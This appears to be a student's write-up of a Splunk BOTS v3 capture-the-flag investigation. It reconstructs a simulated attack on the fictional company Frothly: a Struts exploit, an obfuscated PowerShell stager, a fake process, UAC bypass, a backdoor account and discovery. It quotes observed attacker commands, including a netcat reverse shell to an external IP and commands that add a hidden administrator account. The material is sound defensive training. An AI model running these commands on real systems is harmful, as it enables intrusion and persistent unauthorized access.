# Attack Story — BOTS v3 Investigation
## Frothly Enterprise Breach Reconstruction

> This document reconstructs the complete attack against
> Frothly based on real log analysis in Splunk.
> Investigation conducted by : Ton Nom

---

## The Victim

**Company :** Frothly (fictional craft beer company)
**Infrastructure :** Hybrid — Windows endpoints + Linux servers + AWS Cloud
**Compromised host :** FYODOR-L.froth.ly
**Compromised account :** AzureAD\FyodorMalteskesko

---

## The Attacker

**C2 external IP :** 45.77.53.176 (port 8088)
**C2 internal IP :** 192.168.9.30 (port 8080)
**Persistence account created :** svcvnc

---

## The Story

### Phase 1 — Initial Access (CONFIRMED)

**Target server :** HOTH (Apache Struts application server)
**Attacker IP :** 192.168.8.103
**Endpoint :** /frothlyinventory/integration/saveGangster.action
**Time :** 07:05 → 07:34 on 08/20/2018 (15 POST requests)

The attacker sent 15 HTTP POST requests containing
malicious OGNL (Object-Graph Navigation Language)
expressions in the `name=` parameter — exploiting
Apache Struts vulnerability (T1190).

The OGNL payload disabled Struts security restrictions
and executed arbitrary OS commands on the Linux server :

Commands executed via RCE :
- cat /etc/passwd     → user enumeration
- sudo bash           → privilege escalation attempt
- ls /tmp             → file system discovery
- grep tomcat         → service discovery
- ls -ltr             → directory listing

The command output was returned directly in the
HTTP response — confirming successful Remote Code
Execution (RCE).

Evidence : stream:http logs showing POST requests
with OGNL expressions and explosion of network
activity from 2 events/min to 57 events/min
at exactly 07:05.

<img width="1919" height="673" alt="Capture d&#39;écran 2026-06-06 183126" src="https://github.com/user-attachments/assets/24f2c04f-cd4d-4116-a1a1-c1979bd17ec2" />

<img width="1502" height="630" alt="Capture d&#39;écran 2026-06-06 183312" src="https://github.com/user-attachments/assets/222bdc70-e1f5-40f0-96c2-eab993d9b665" />

---

### Phase 2 — Execution
Once inside, the attacker executed a heavily obfuscated
PowerShell command on FYODOR-L :

```
powershell.exe -NoP -NonI -W Hidden -enc <Base64_payload>
```

The decoded payload :
- Disabled AMSI (Antimalware Scan Interface)
- Disabled Script Block Logging
- Created a WebClient object to download additional payloads
- Used RC4 encryption to hide downloaded content
- Executed everything in memory via Invoke-Expression (IEX)

**Evidence :** EventCode 4688, Sysmon EventID 1 on FYODOR-L

<img width="903" height="346" alt="image" src="https://github.com/user-attachments/assets/28e3ce4b-8ded-4fa6-824a-f67d5aabccf3" />

---

### Phase 3 — Defense Evasion
The attacker dropped a malicious executable disguised
as Internet Explorer :

**File :** `C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe`

Why suspicious :
- Fake name mimicking `iexplore.exe` (Internet Explorer)
- Executed from `C:\Windows\Temp\` — classic malware location
- Launched by hidden PowerShell
- Used to send commands to the internal C2 server

<img width="1446" height="739" alt="Capture d&#39;écran 2026-05-23 211713" src="https://github.com/user-attachments/assets/6bbe28e3-aac2-4f5a-87c9-8db54746436a" />

---

### Phase 4 — Command & Control
Two C2 channels were established :

**External C2 :**
```
/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe
```
A reverse shell using Netcat connecting back to the
attacker's external server.

**Internal C2 :**
`iexeplorer.exe` communicated with `192.168.9.30:8080`
via multiple endpoints :
- `/frothlyinventory/showcase.action`
- `/login/process.php`
- `/news.php`
- `/admin/get.php`

<img width="1446" height="739" alt="Capture d&#39;écran 2026-05-23 211713" src="https://github.com/user-attachments/assets/6bbe28e3-aac2-4f5a-87c9-8db54746436a" />

---

### Phase 5 — Privilege Escalation
The attacker used the **Fodhelper UAC Bypass** technique :

1. Modified registry key :
   `HKCU\Software\Classes\ms-settings\Shell\Open\command`

<img width="1575" height="153" alt="Capture d&#39;écran 2026-06-03 151805" src="https://github.com/user-attachments/assets/3a3fa7d2-9a7e-40c3-9753-70c8896807b1" />

3. Stored PowerShell payload in :
   `HKCU\Software\Microsoft\Windows Update\Update`
<img width="1610" height="154" alt="Capture d&#39;écran 2026-06-03 151517" src="https://github.com/user-attachments/assets/97a0c8ad-4052-4f98-bdcd-c0995d0de2d3" />

4. Launched `fodhelper.exe` — a Microsoft auto-elevated binary
5. Windows executed the payload with elevated privileges
   without showing a UAC prompt to the user

**Evidence :** Sysmon EventID 13 (Registry Value Set)

---

### Phase 6 — Persistence
The attacker created a backdoor account :

```
net user /add svcvnc Password123!
net localgroup administrators svcvnc /add
```

Account lifecycle confirmed by EventCodes :
- **4720** — Account created
- **4722** — Account enabled
- **4724** — Password set
- **4732** — Added to Administrators group

The name `svcvnc` mimics a service account name to
avoid suspicion, while the `vnc` suffix suggests
the attacker planned to use VNC for remote access.

<img width="660" height="451" alt="Capture d&#39;écran 2026-06-03 141048" src="https://github.com/user-attachments/assets/0dfa46b9-7053-4b56-b3c4-559375ae9b58" />

-> Event ID 4720 → account creation

<img width="1301" height="565" alt="Capture d&#39;écran 2026-06-03 133518" src="https://github.com/user-attachments/assets/925abcd7-4fb7-4a4f-9dd9-2d244c1bee3c" />


-> Event ID 4732 → Adding to a Local Group

<img width="1236" height="656" alt="Capture d&#39;écran 2026-06-03 133933" src="https://github.com/user-attachments/assets/3b24d260-e5f9-44e2-8841-ccdbbb1f409b" />


-> Event ID 4732 → Adding to the Administrators group

<img width="1432" height="685" alt="Capture d&#39;écran 2026-06-03 133838" src="https://github.com/user-attachments/assets/ebcec89c-9296-49fa-ba7e-795e2e6d9e12" />



-> Event ID 4722 → Account Activation

<img width="1015" height="540" alt="Capture d&#39;écran 2026-06-03 134604" src="https://github.com/user-attachments/assets/83dab949-ecfc-4eea-a1c9-fd9ed9da1813" />


-> Event ID 4724 → password reset

<img width="1111" height="573" alt="Capture d&#39;écran 2026-06-03 134710" src="https://github.com/user-attachments/assets/f55c412f-5800-474d-9923-d81ae4acc267" />


---

### Phase 7 — Discovery
Post-compromise reconnaissance observed :

- **WMIC** used for system fingerprinting (536 detections)
- **Netstat** used to map active connections (78 detections)
- **Registry enumeration** for installed software (1037 detections)
- **SMB scanning** on port 139 toward :
  - 192.168.70.186
  - 192.168.8.103
  - 192.168.8.116
- **Linux commands** executed on compromised server :
  - `cat /etc/passwd` — user enumeration
  - `base64 --decode /tmp/colonel > /tmp/colonel.c` — payload decoding

<img width="1196" height="605" alt="Capture d&#39;écran 2026-06-03 160203" src="https://github.com/user-attachments/assets/3c7c41a1-5dd9-4e57-8781-6df4d9dd1162" />

<img width="664" height="328" alt="Capture d&#39;écran 2026-06-03 154315" src="https://github.com/user-attachments/assets/d9a28a81-1039-4592-b829-a25e001a6be6" />


---

## Summary

The attack followed a complete kill chain :
**Struts exploit ( Apache Struts vulnerability ) → PowerShell stager → Fake process → Reverse shell → UAC bypass → Backdoor account → Network reconnaissance**

The attacker demonstrated advanced techniques including
AMSI bypass, registry-based payload storage, UAC bypass,
and dual C2 channels (internal + external).
